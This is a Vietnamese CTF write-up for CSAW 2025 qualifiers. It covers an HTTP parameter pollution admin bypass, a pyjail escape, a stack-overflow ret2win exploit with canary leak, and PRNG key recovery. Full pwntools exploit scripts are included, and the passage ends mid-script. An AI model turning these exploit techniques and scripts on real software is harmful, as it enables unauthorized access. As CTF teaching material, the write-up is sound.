---
title: CSAW CTF Qualification Round 2025
date: 2025-09-17 09:00 +0700
tags: [ctf, web, reversing, pwnable, misc]
categories: [CTF Writeups]
author: ZennisKayy
math: true
image: 
  path: /assets/img/CSAW-25/logo.png
---

# **Web**
## **Orion Override**

Bài "Orion Override" thử thách người chơi tìm ra và khai thác một lỗ hổng logic trong cơ chế kiểm soát quyền truy cập của một ứng dụng web. Mục tiêu là giành được quyền quản trị viên (admin) để thực hiện một hành động đặc biệt và lấy được cờ (flag).

---

### **Phân tích trang đăng nhập và tìm thông tin xác thực**

Khi truy cập vào đường link `https://orion-override.ctf.csaw.io/`, chúng ta được dẫn đến một trang đăng nhập.

Hành động đầu tiên trong các bài CTF web là luôn kiểm tra mã nguồn của trang (`View Page Source` hoặc `Ctrl+U`). Trong mã nguồn HTML của trang đăng nhập, có một gợi ý rất rõ ràng do "thực tập sinh" để lại:

```html
<!-- the intern left a note on the wall, what could it be? -->
<!-- user:password -->
```

Gợi ý này cung cấp cho chúng ta thông tin đăng nhập:
*   **Username:** `user`
*   **Password:** `password`

### **Đăng nhập và phân tích trang Dashboard**

Sử dụng thông tin đăng nhập trên, chúng ta đăng nhập thành công và được chuyển hướng đến trang tổng quan người dùng (User Dashboard).

Tại đây, chúng ta thấy các thông tin về nhiệm vụ nhưng các chức năng quan trọng như "Abort Mission" đều bị vô hiệu hóa với thông báo "You are not the admin".

Điểm mấu chốt ở bước này là quan sát thanh địa chỉ (URL) của trình duyệt. URL sau khi đăng nhập có dạng:

```
https://orion-override.ctf.csaw.io/dashboard?admin=false
```

Tham số `?admin=false` ngay lập tức gợi ý rằng ứng dụng có thể đang dựa vào tham số này trên URL để xác định quyền hạn của người dùng.

### **Khai thác lỗ hổng Logic - HTTP Parameter Pollution (HPP)**

Suy nghĩ đầu tiên của nhiều người là thử thay đổi `admin=false` thành `admin=true`. Tuy nhiên, trong trường hợp này, máy chủ có thể đã được cấu hình để bỏ qua hoặc từ chối thay đổi đơn giản này.

Đây là lúc chúng ta cần áp dụng một kỹ thuật nâng cao hơn một chút: **HTTP Parameter Pollution (HPP)**. Kỹ thuật này khai thác cách các công nghệ backend khác nhau xử lý các tham số có tên trùng lặp trong một yêu cầu HTTP. Ví dụ, khi nhận được URL `?name=John&name=Doe`, một số máy chủ sẽ lấy giá trị đầu tiên (`John`), một số lấy giá trị cuối cùng (`Doe`) và một số khác kết hợp chúng lại (`John, Doe`).

Trong bài này, ứng dụng có thể đang kiểm tra giá trị của tham số `admin` đầu tiên. Nếu nó là `false`, logic kiểm tra sẽ dừng lại. Tuy nhiên, nếu chúng ta "gây nhiễu" (pollute) URL bằng cách thêm một tham số `admin` nữa, chúng ta có thể bypass được cơ chế kiểm tra này.

Chúng ta sẽ thêm `&admin=true` vào cuối URL hiện tại:

**Exploit URL:**
```
https://orion-override.ctf.csaw.io/dashboard?admin=false&admin=true
```

Khi truy cập vào URL này, backend của ứng dụng có thể đã xử lý tham số `admin` cuối cùng (`true`) và cấp cho chúng ta quyền quản trị viên, mặc dù tham số đầu tiên là `false`.

### **Giành quyền Admin và lấy Flag**

Sau khi truy cập vào URL đã được sửa đổi, trang web tải lại và giao diện đã thay đổi. Các nút "Abort Mission", "Override Navigation" và "Override Life Support" không còn bị vô hiệu hóa nữa.

Chúng ta nhấp vào nút **"Abort Mission"**. Một thông báo (alert) sẽ hiện ra, chứa flag của bài CTF.

> Flag: `csawctf{h7tpp0llut10n_0r10n_z8y7x6w5v4u3}`
{: .prompt-flag }

---

# Misc
## Galaxy

Thử thách này là một dạng "pyjail" cổ điển, nơi chúng ta cần thoát khỏi hoặc lạm dụng một môi trường `eval()` bị giới hạn nặng nề để đọc được flag. Điểm đặc biệt của bài này là nó kết hợp pyjail với một lớp mã hóa và một giới hạn độ dài payload nghiêm ngặt, đòi hỏi một chiến lược khai thác nhiều giai đoạn.

### **Phân tích mã nguồn**

Mã nguồn cung cấp cho chúng ta một số thành phần chính:

1.  **`class galaxy_str`**:
    *   Lớp này chứa flag trong thuộc tính `self._s`.
    *   `__str__` và `__repr__` được ghi đè để trả về `<galaxy hidden>`, ngăn chặn việc in trực tiếp.
    *   `__getitem__` (toán tử `[]`) là điểm yếu cốt lõi. Nó chặn các chỉ số là số nguyên không âm (`key >= 0`), nhưng lại **cho phép các chỉ số là số nguyên âm**. Đây là "cửa sau" để chúng ta đọc flag.

2.  **`class galaxy_aura`**:
    *   Lớp này triển khai một mật mã thay thế (substitution cipher) đơn giản. Nó tạo ra một "key" ngẫu nhiên và xáo trộn toàn bộ bảng chữ cái (`a-z` và `'`).
    *   Hàm `unwarp()` sẽ giải mã đầu vào của chúng ta trước khi nó được `eval()`. Điều này có nghĩa là chúng ta không thể gửi trực tiếp payload `spiral[-1]`; chúng ta phải gửi phiên bản đã được mã hóa (warped) của nó. Vấn đề là: key là ngẫu nhiên và chúng ta không biết nó.

3.  **Hàm `sanitize` và vòng lặp chính**:
    *   `sanitize()` lọc đầu vào (sau khi đã `unwarp`) và chỉ cho phép một bộ ký tự rất hạn chế: `([<~abcdefghijklmnopqrstuvwxyz>+]/*\')`.
    *   Đáng chú ý là không có các ký tự số (`0-9`), dấu chấm (`.`), hoặc dấu gạch dưới (`_`). Việc thiếu số buộc chúng ta phải tự "tạo" ra chúng.
    *   Vòng lặp chính có một giới hạn cực kỳ quan trọng: `if len(gathered_input) > 150: gathered_input = gathered_input[:150]`. Bất kỳ payload nào dài hơn 150 ký tự sẽ bị cắt ngắn, rất có thể sẽ gây ra `SyntaxError`.

### **Xây dựng chiến lược khai thác**

Từ phân tích trên, chúng ta có một kế hoạch gồm nhiều bước:

1.  **Phá vỡ mật mã:** Chúng ta cần tìm ra key của `galaxy_aura` để có thể mã hóa payload của mình.
2.  **Tạo ra các số nguyên âm:** Sử dụng các ký tự được phép để tạo ra các số `-1, -2, -3, ...`
3.  **Vượt qua giới hạn 150 ký tự:** Tạo ra các số lớn (ví dụ: `25`) bằng cách sử dụng payload ngắn nhất có thể.
4.  **Lấy flag:** Kết hợp tất cả lại để gửi các payload đã được mã hóa và tối ưu hóa nhằm đọc từng ký tự của flag từ cuối lên đầu.

### **Khai thác chi tiết**

#### **Bước 1:** Phá vỡ mật mã - The Oracle

Chúng ta không biết key, nhưng chúng ta có thể hỏi server từng chút một. Chúng ta cần một "oracle" - một kỹ thuật cho phép chúng ta nhận được phản hồi "có/không" hoặc một mẩu thông tin nhỏ.

*   **Tìm ký tự mã hóa của `'` (WARPED_QUOTE):**
    Chúng ta gửi một payload có dạng `c + 'a' + c`, trong đó `c` là ký tự chúng ta đang thử.
    *   **Nếu `unwarp(c)` không phải là `'`**: Payload sau khi giải mã sẽ là một chuỗi vô nghĩa như `'x' + unwarp('a') + 'x'`, ví dụ `zxz`. `eval('zxz')` sẽ gây ra `NameError`. Server trả về `no galaxy`.
    *   **Nếu `unwarp(c)` là `'`**: Payload sau khi giải mã sẽ trở thành `"'"+unwarp('a')+"'"`, ví dụ `'z'`. `eval("'z'")` là một biểu thức hợp lệ và trả về chuỗi `z`. Server sẽ trả về một output thay vì lỗi.
    Bằng cách lặp qua tất cả các ký tự, ký tự `c` nào không gây ra lỗi `no galaxy` chính là `WARPED_QUOTE`.

*   **Lấy toàn bộ bản đồ giải mã:**
    Khi đã có `WARPED_QUOTE`, chúng ta có thể hỏi về các ký tự khác bằng payload `WARPED_QUOTE + c + WARPED_QUOTE`. Server sẽ giải mã nó thành `"'"+unwarp(c)+"'"` và `eval` sẽ trả về giá trị của `unwarp(c)`. Bằng cách này, chúng ta xây dựng được toàn bộ `reverse_map` và từ đó suy ra `warp_map`.

#### **Bước 2:** Tạo số và chỉ số âm

*   `False` -> `('a'>'b')` -> `0`
*   `True` -> `('a'<'b')` -> `1`
*   `-1` -> `~0` -> `~('a'>'b')`
*   `-2` -> `~1` -> `~('a'<'b')`
*   `-n` -> `~(n-1)`

#### **Bước 3:** Vượt qua giới hạn 150 ký tự - Tối ưu hóa Payload

Đây là phần khó nhất. Để lấy ký tự thứ 27 từ cuối (`{`), chúng ta cần tạo ra chỉ số `-27`, tương đương với việc tạo ra số `26`.

*   **Cách tiếp cận ngây thơ:** `1+1+1...+1` (26 lần). Payload này sẽ dài hàng trăm ký tự và chắc chắn bị cắt.
*   **Cách tiếp cận tốt hơn:** Dùng luỹ thừa của 2: `16+8+2`. Vẫn còn dài.
*   **Cách tiếp cận tối ưu (sử dụng cả `+` và `*`):** Chúng ta nhận thấy rằng `26 = 2 * 13`. Tạo payload cho `2` và `13` rồi nhân chúng lại sẽ ngắn hơn nhiều. Vấn đề này có thể được giải quyết bằng **Quy hoạch động (Dynamic Programming)**. Script giải sẽ tính toán trước cách tạo ra mỗi số từ 0 đến 100 bằng chuỗi payload ngắn nhất có thể, bằng cách thử cả phép cộng và phép nhân ở mỗi bước.

Hàm `build_optimized_payloads` trong script thực hiện chính xác điều này. Nó tạo ra một "bảng tra cứu" các payload số hiệu quả nhất.

### **Script**

1.  **`build_optimized_payloads(100)`**: Tính toán trước các payload ngắn nhất để tạo số từ 0-99.
2.  **`solve()`**:
    *   Kết nối đến server.
    *   **Bước 1**: Chạy oracle `c+'a'+c` để tìm `WARPED_QUOTE`.
    *   **Bước 2 & 3**: Chạy oracle `WARPED_QUOTE+c+WARPED_QUOTE` để xây dựng `reverse_map` và `warp_map`.
    *   **Bước 4**: Bắt đầu một vòng lặp để lấy flag:
        *   Đối với mỗi chỉ số `i` từ 1 đến 100:
        *   Tạo payload gốc, ví dụ `spiral[~(<payload cho i-1>)]`.
        *   Sử dụng `warp_map` để mã hóa payload gốc này thành `warped_payload`.
        *   Gửi `warped_payload` đến server.
        *   Nhận và lưu lại ký tự trả về.
        *   Vòng lặp dừng lại khi server trả về `no galaxy` (nghĩa là đã đi hết chiều dài của flag).
    *   Đảo ngược chuỗi ký tự đã thu thập và có flag.

```python
from pwn import *
import math

HOST = "chals.ctf.csaw.io"
PORT = 21009

OPTIMIZED_PAYLOADS = {}

def build_optimized_payloads(max_n):
    log.info(f"Pre-calculating shortest payloads for numbers up to {max_n}...")
    
    # Base cases
    one_payload = "('a'<'b')"
    OPTIMIZED_PAYLOADS[0] = "('a'>'b')"
    OPTIMIZED_PAYLOADS[1] = one_payload

    for i in range(2, max_n + 1):
        # Lựa chọn 1: Tạo bằng phép cộng (i-1) + 1
        payload_add = f"({OPTIMIZED_PAYLOADS[i-1]}+{one_payload})"
        min_len = len(payload_add)
        best_payload = payload_add

        # Lựa chọn 2: Thử tất cả các khả năng nhân j * k = i
        for j in range(2, int(math.sqrt(i)) + 1):
            if i % j == 0:
                k = i // j
                payload_mult = f"({OPTIMIZED_PAYLOADS[j]}*{OPTIMIZED_PAYLOADS[k]})"
                if len(payload_mult) < min_len:
                    min_len = len(payload_mult)
                    best_payload = payload_mult
        
        OPTIMIZED_PAYLOADS[i] = best_payload
    log.success("Payload calculation complete.")

def get_neg_index_payload(n):
    """Lấy payload đã được tính toán trước để có chỉ số âm -n."""
    if n == 1:
        return "~('a'>'b')" # ~0 = -1
    if n > 1:
        # Để có -n, chúng ta cần tính ~(n-1)
        number_payload = OPTIMIZED_PAYLOADS[n-1]
        return f"~({number_payload})"
    return None

def solve():
    build_optimized_payloads(100)
    
    p = remote(HOST, PORT)
    possible_chars = 'abcdefghijklmnopqrstuvwxyz\''
    
    log.info("Step 1: Finding WARPED_QUOTE...")
    WARPED_QUOTE = None
    for char in possible_chars:
        payload = char + 'a' + char
        p.recvuntil(b'> ')
        p.sendline(payload.encode())
        response = p.recvline().strip().decode()
        if 'no galaxy' not in response: WARPED_QUOTE = char; break
    log.success(f"Found WARPED_QUOTE: '{WARPED_QUOTE}'")

    log.info("Step 2: Building reverse map...")
    reverse_map = {WARPED_QUOTE: "'"}
    chars_to_discover = [c for c in possible_chars if c != WARPED_QUOTE]
    for char in chars_to_discover:
        payload = WARPED_QUOTE + char + WARPED_QUOTE
        p.recvuntil(b'> ')
        p.sendline(payload.encode())
        reverse_map[char] = p.recvline().strip().decode()
    log.success(f"Built reverse map with {len(reverse_map)} entries.")

    log.info("Step 3: Building warp map...")
    warp_map = {v: k for k, v in reverse_map.items()}
    log.success("Warp map created.")

    log.info("Step 4: Retrieving flag with FULLY OPTIMIZED payloads...")
    flag_chars = []
    for i in range(1, 101):
        index_payload = get_neg_index_payload(i)
        original_payload = f"spiral[{index_payload}]"
        
        if len(original_payload) > 150:
            log.warning(f"Original payload for index {-i} is too long ({len(original_payload)} chars)! Stopping.")
            break

        warped_payload = "".join([warp_map.get(c, c) for c in original_payload])

        p.recvuntil(b'> ')
        p.sendline(warped_payload.encode())
        response = p.recvline().strip().decode()

        if 'no galaxy' in response:
            log.info("End of flag reached.")
            break
        
        flag_chars.append(response)
        # log.info(f"Got char: {response}")

    flag = "".join(reversed(flag_chars))
    log.success(f"FLAG: {flag}")

    p.close()

if __name__ == "__main__":
    solve()
```

> Flag: `csawctf{g@l@xy_0bserv3r$}`
{: .prompt-flag }

---

# **Pwn**
## **Mooneys Bookstore**

Đây là một bài pwn tương đối kinh điển, khai thác lỗ hổng Stack Buffer Overflow. Tuy nhiên, nó được cài cắm nhiều "bẫy" nhỏ để đánh lừa người chơi, đòi hỏi phải phân tích kỹ lưỡng và đi qua từng bước một cách cẩn thận.

#### **Tóm tắt**

Thử thách yêu cầu khai thác lỗ hổng `gets` để thực hiện tấn công ret2win. Lộ trình khai thác bao gồm:
1.  Sử dụng lỗ hổng đọc bộ nhớ tùy ý (Arbitrary Memory Read) trong `main` để leak giá trị của `secret_key`.
2.  Gửi lại `secret_key` để vào được hàm `get_input`.
3.  Trong `get_input`, chương trình tự làm lộ giá trị của Stack Canary. Chúng ta đọc và lưu lại giá trị này.
4.  Tính toán offset chính xác để overflow, đặc biệt chú ý đến một biến ẩn trên stack (`FILE *local_10`) nằm giữa canary và địa chỉ trả về.
5.  Sử dụng một `ret` gadget để giải quyết vấn đề căn lề stack (Stack Alignment) trước khi gọi hàm `get_flag`.
6.  Ghi đè địa chỉ trả về bằng địa chỉ của hàm `get_flag` để lấy flag.

---

### **Phân tích file**

Đầu tiên, chúng ta kiểm tra các cơ chế bảo vệ của file binary bằng `checksec`:

```
$ checksec overflow_me
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found  <-- BẪY!
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

*   **NX enabled:** Ngăn xếp không thể thực thi, chúng ta không thể inject shellcode lên stack. Bắt buộc phải dùng ROP (Return-Oriented Programming).
*   **No PIE:** Chương trình luôn được tải vào một địa chỉ cơ sở cố định (`0x400000`). Điều này làm cho việc khai thác dễ hơn rất nhiều vì địa chỉ của các hàm (`main`, `get_flag`) và biến toàn cục (`secret_key`) là không đổi.
*   **No canary found:** Đây là một cái bẫy kinh điển. File binary mà chúng ta có ở local có thể đã được biên dịch mà không có canary. Tuy nhiên, file chạy trên server **CÓ CANARY**. Bằng chứng là chương trình báo lỗi sai canary và logic khai thác chỉ hoạt động khi chúng ta bảo toàn giá trị canary.

### **Phân tích mã nguồn**

#### **Hàm `main`**

```c
undefined8 main(void)
{
  ...
  // Lỗ hổng Arbitrary Memory Read
  puts("\nYour favorite book waits for you. Tell me its address");
  read(0, &local_10, 8); // Đọc 8 byte địa chỉ từ người dùng
  printf("%lx\n", *local_10); // In ra giá trị tại địa chỉ đó

  // Cơ chế bảo vệ secret_key
  puts("\nOf course there's a key. There always is. If you speak it, the story unlocks");
  read(0, &local_18, 8); // Đọc 8 byte key
  if (local_18 == secret_key) {
    get_input(); // Mục tiêu là vào được đây
  }
  ...
}
```
Hàm `main` cho chúng ta một lần đọc giá trị tại một địa chỉ bất kỳ. Chúng ta sẽ dùng nó để đọc giá trị của biến toàn cục `secret_key`, sau đó gửi lại chính giá trị đó để vượt qua vòng kiểm tra và gọi hàm `get_input`.

#### **Hàm `get_input` (Nơi chứa lỗ hổng chính)**

```c
void get_input(void)
{
  char local_58 [64]; // Buffer
  long local_18;      // Canary
  FILE *local_10;     // <-- Biến quan trọng bị bỏ sót
  
  ...
  local_18 = val; // Gán giá trị ngẫu nhiên cho canary
  
  // Canary bị leak
  printf("\n\t... It has something for you: 0x%lx\n", val);
  
  puts("\nYour turn now. Write yourself into this story.");
  fflush(stdout);
  
  // Lỗ hổng Buffer Overflow
  gets(local_58);
  
  // Kiểm tra Canary
  if (local_18 != val) {
    puts("\nDisappointing...");
    exit(1);
  }
  return;
}
```
Đây là nơi chứa mọi thứ chúng ta cần:
1.  Chương trình tự in ra giá trị canary.
2.  Lỗ hổng `gets` cho phép chúng ta ghi tràn bộ đệm.
3.  **Chi tiết quan trọng nhất:** Phân tích vị trí các biến trên stack.
    *   `char local_58[64]`
    *   `long local_18` (Canary)
    *   `FILE *local_10` (Một con trỏ 8 byte)
    *   `Saved RBP` (8 byte)
    *   `Return Address` (8 byte)

Điều này có nghĩa là, từ canary đến địa chỉ trả về, chúng ta phải đi qua `local_10` (8 byte) và `Saved RBP` (8 byte), tổng cộng là **16 byte padding**, chứ không phải 8 byte như chúng ta lầm tưởng ban đầu.

#### **Hàm `get_flag`**

```c
void get_flag(void)
{
  fflush(stdout);
  system("cat flag.txt");
  ...
}
```
Đây là hàm "win" của chúng ta. Mục tiêu là chuyển hướng thực thi đến đây.

### **Lộ trình khai thác**

1.  **Leak `secret_key`**: Gửi địa chỉ của `secret_key` (lấy từ ELF) cho chương trình, đọc giá trị trả về.
2.  **Vào `get_input`**: Gửi lại giá trị `secret_key` vừa leak.
3.  **Leak Canary**: Đọc và lưu lại giá trị canary mà chương trình in ra.
4.  **Xây dựng Payload**:
    *   Padding 64 byte để lấp đầy buffer `local_58`.
    *   Gửi lại 8 byte canary vừa leak.
    *   Padding **16 byte** để ghi đè lên `local_10` và `Saved RBP`.
    *   Gửi địa chỉ của một `ret` gadget để sửa lỗi căn lề stack.
    *   Gửi địa chỉ của hàm `get_flag`.
5.  **Gửi Payload và nhận Flag**.

### **Script**

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./overflow_me', checksec=False)
p = remote('chals.ctf.csaw.io', 21006)

secret_key_addr = elf.symbols['secret_key']
p.recvuntil(b'Tell me its address\n')
p.send(p64(secret_key_addr))
leaked_secret_key = int(p.recvline().strip(), 16)

p.recvuntil(b'the story unlocks\n')
p.send(p64(leaked_secret_key))
log.info("Sent secret_key, entering get_input function...")

p.recvuntil(b'for you: 0x')
leaked_canary = int(p.recvline().strip(), 16)
log.success(f"Leaked secret_key: {hex(leaked_secret_key)}")
log.success(f"Leaked CANARY: {hex(leaked_canary)}")

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret']).address
log.info(f"Found ret gadget to align stack at: {hex(ret_gadget)}")

get_flag_addr = elf.symbols['get_flag']

offset_to_canary = 64

payload = b''
payload += b'A' * offset_to_canary
payload += p64(leaked_canary)
payload += b'B' * 16
payload += p64(ret_gadget)
payload += p64(get_flag_addr)

log.info(f"Final payload is created with len: {len(payload)}")

p.recvuntil(b'Write yourself into this story.\n')
p.sendline(payload)
log.success("Final payload sent!")

p.interactive()
```

> Flag: `Forgot to save it :))`
{: .prompt-flag }

---

# **Reverse**
## **Shadow Protocol**

Challenge này yêu cầu chúng ta giải mã một thông điệp được mã hóa bằng một giao thức tùy chỉnh có tên "Shadow Protocol". Bằng cách phân tích file binary, chúng ta có thể tìm ra điểm yếu trong thuật toán sinh khóa, từ đó tái tạo lại khóa và giải mã thông điệp.

### **Tóm Tắt**

*   **Điểm yếu cốt lõi:** Thuật toán sinh số ngẫu nhiên (PRNG) sử dụng một "hạt giống" (seed) có thể dự đoán được, đó chính là thời gian Unix (timestamp) được làm tròn xuống phút gần nhất. Chương trình sau đó lại **in ra chính xác seed này**, cho phép chúng ta tái tạo lại toàn bộ quá trình.
*   **Hướng giải quyết:** Viết một script Python để mô phỏng lại toàn bộ logic sinh khóa của chương trình C, từ việc tạo số ngẫu nhiên, xây dựng và duyệt cây, cho đến thuật toán mã hóa cuối cùng để lấy được khóa mã hóa (keystream). Cuối cùng, dùng phép XOR để giải mã flag.

---

### **Phân tích pseudocode**

Chương trình thực hiện một chuỗi các bước phức tạp để tạo ra một khóa mã hóa 8-byte (keystream) rồi dùng nó để mã hóa flag.

**Luồng hoạt động của hàm `main`:**

1.  **Tạo Seed:** Lấy timestamp hiện tại, chia cho 60 rồi nhân với 60 (`(t / 0x3c) * 0x3c`). Thao tác này làm tròn thời gian xuống phút gần nhất.
2.  **Sinh Số Ngẫu Nhiên:** Dùng timestamp đã làm tròn làm seed cho hàm `srand()`. Sau đó, gọi `rand()` hai lần để tạo ra một số ngẫu nhiên 64-bit `local_d8`.
3.  **Xây Dựng Cây (`build_bittree`):** Sử dụng số 64-bit `local_d8` làm đầu vào để xây dựng một cây nhị phân cân bằng. Giá trị của các node lá (leaf node) được tính toán dựa trên các phép dịch bit phức tạp từ `local_d8`.
4.  **Trộn Dữ Liệu Từ Cây (`shadow_tree_mix`):** Hàm này duyệt cây theo thứ tự sau (post-order traversal). Khi gặp một node lá, nó lấy 3 bit cuối của giá trị tại node đó và ghép vào một biến kết quả 64-bit mới (`local_f0`). Về cơ bản, nó "trộn" các bit từ `local_d8` theo một thứ tự mới.
5.  **Tạo Khóa Mã Hóa (`shadow_protocol`):** Biến `local_f0` được đưa vào hàm này. `shadow_protocol` là một thuật toán mã hóa khối (block cipher) tùy chỉnh, bao gồm 8 vòng lặp. Mỗi vòng lặp thực hiện:
    *   **Substitution:** Thay thế các byte bằng một bảng tra cứu (S-box). Sau khi trích xuất, chúng ta phát hiện đây chính là **Rijndael S-box** (dùng trong AES).
    *   **Permutation:** Trộn lẫn dữ liệu bằng các phép toán XOR, cộng, và quay bit (bit rotation).
    *   Kết quả cuối cùng sau 8 vòng lặp và một vài biến đổi cuối cùng là khóa mã hóa `local_c8`.
6.  **Mã Hóa và In Kết Quả:** Chương trình đọc `flag.txt`, thực hiện phép XOR từng byte của flag với các byte của khóa `local_c8` (lặp lại khóa nếu flag dài hơn 8 byte). Cuối cùng, nó in ra `timestamp` đã dùng và flag đã được mã hóa dưới dạng HEX.

---

### **2. Lên kế hoạch tấn công**

Điểm yếu chí mạng là chương trình đã cho chúng ta biết chính xác giá trị `timestamp` được dùng làm seed. Điều này biến một quá trình trông có vẻ ngẫu nhiên trở nên hoàn toàn có thể dự đoán.

Kế hoạch của chúng ta là viết một script mô phỏng lại từng bước một:

1.  **Lấy input:** Nhận `timestamp` và `ciphertext` từ server.
2.  **Tái tạo `local_d8`:** Dùng `ctypes` để gọi thư viện `libc` của hệ thống, `srand()` với `timestamp` và `rand()` 2 lần để có được số 64-bit giống hệt chương trình gốc.
3.  **Tái tạo `local_f0`:** Viết lại logic của `build_bittree` và `shadow_tree_mix` để tính toán ra giá trị `local_f0` từ `local_d8`.
4.  **Tái tạo `local_c8`:** Trích xuất S-box từ file binary, sau đó viết lại chính xác thuật toán 8 vòng lặp của `shadow_protocol` để tạo ra khóa `local_c8`.
5.  **Giải mã:** Dùng khóa `local_c8` vừa tạo để XOR ngược lại với `ciphertext` và lấy flag.

---

### **3. Điểm lưu ý trong `build_bittree`**

Trong quá trình viết script, chúng ta gặp phải lỗi `UnicodeDecodeError`. Lỗi này cho thấy kết quả giải mã không phải là một chuỗi văn bản hợp lệ, đồng nghĩa với việc khóa mã hóa đã bị tính toán sai.

Sau khi xác nhận S-box và các phần khác đã đúng, việc kiểm tra lại logic của `build_bittree` đã phát hiện ra một trường hợp đặc biệt bị bỏ sót:

```c
iVar1 = leaf_index * -3 + 63;
if (iVar1 < 2) {
    if (iVar1 == 0) { // <-- SPECIAL CASE
        leaf_value = ((rand_64bit & 1) << 2) | 3;
    }
    // ...
}
else {
    shift = (iVar1 - 2) & 0x3f;
    leaf_value = (rand_64bit >> shift) & 7;
}
```

Phiên bản script đầu tiên chỉ implment logic của trường hợp chung (`else`), áp dụng cho tất cả các node lá. Tuy nhiên, với node lá cuối cùng (chỉ số `i = 21`), giá trị `iVar1` sẽ bằng 0, rơi vào trường hợp đặc biệt. Việc bỏ qua logic này đã làm cho giá trị của node lá cuối cùng bị sai, dẫn đến `local_f0` sai và toàn bộ khóa mã hóa sau đó cũng sai.

---

### **4. Script**

```python
import ctypes
import sys

# Take from server
TIMESTAMP = 1915532940
ENCRYPTED_FLAG_HEX = "27C4817F48267DD83684963B59672ACD23E8D5601F362BD43DE8907A1B652BC074DBD5571A6744C077C5D73C1A3C2ADA1BD9D03F74612FD03DCA"

sbox = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
]
# =====================================================

# Hàm helper
def u32(n):
    return n & 0xFFFFFFFF

def u64(n):
    return n & 0xFFFFFFFFFFFFFFFF

def ror(val, bits, size=32):
    return ((val >> bits) | (val << (size - bits))) & ((1 << size) - 1)

def reproduce_rand_64(seed):
    try:
        libc = ctypes.CDLL("libc.so.6")
    except OSError:
        print("Error: Not found 'libc.so.6'.")
        sys.exit(1)
    libc.srand.argtypes = [ctypes.c_uint]
    libc.rand.restype = ctypes.c_int
    libc.srand(seed)
    rand1 = libc.rand()
    rand2 = libc.rand()
    return u64((rand1 << 32) | rand2)

def reproduce_shadow_mix(rand_64bit):
    shadow_mix_result = 0
    # Vòng lặp từ 0 đến 0x15 (21), tương ứng với các node lá
    for i in range(22):
        leaf_value = 0
        ivar1 = i * -3 + 63

        if ivar1 < 2:
            if ivar1 == 1: # Trường hợp này không bao giờ xảy ra với i nguyên
                 leaf_value = (rand_64bit * 2) & 6 | 1
            elif ivar1 == 0:
                 leaf_value = ((rand_64bit & 1) << 2) | 3
            else: # ivar1 < 0
                 leaf_value = 7
        else:
            shift_amount = (ivar1 - 2) & 0x3f
            leaf_value = (rand_64bit >> shift_amount) & 7
        
        # Logic từ shadow_tree_mix
        shadow_mix_result = u64((shadow_mix_result << 3) | leaf_value)
        
    return shadow_mix_result
# ======================================================

def reproduce_shadow_protocol(shadow_mix_result):
    local_44 = u32(shadow_mix_result >> 32)
    local_40 = u32(shadow_mix_result)
    constants = [0xa5a5c3c3, 0x5a5a9696, 0x3c3ca5a5, 0xc3c35a5a]
    for i in range(8):
        uVar3 = local_44
        b0 = local_40 & 0xff
        b1 = (local_40 >> 8) & 0xff
        b2 = (local_40 >> 16) & 0xff
        b3 = (local_40 >> 24) & 0xff
        sbox_res = u32(sbox[b0] | (sbox[b1] << 8) | (sbox[b2] << 16) | (sbox[b3] << 24))
        uVar1 = u32(sbox_res ^ constants[i % 4])
        uVar4 = u32(((i + 1) * 0x1337beef) ^ local_44)
        local_44 = local_40
        rot_amount_right = (0x1d - i) & 0x1f
        rotated_val = ror(uVar1, rot_amount_right)
        local_40 = u32(u32(rotated_val + uVar4) ^ uVar3)
    combined = u64((local_44 << 32) | local_40)
    uVar2 = u64(combined ^ 0xdeadbeefcafebabe)
    rotated_uVar2 = u64((uVar2 << 17) | (uVar2 >> 47))
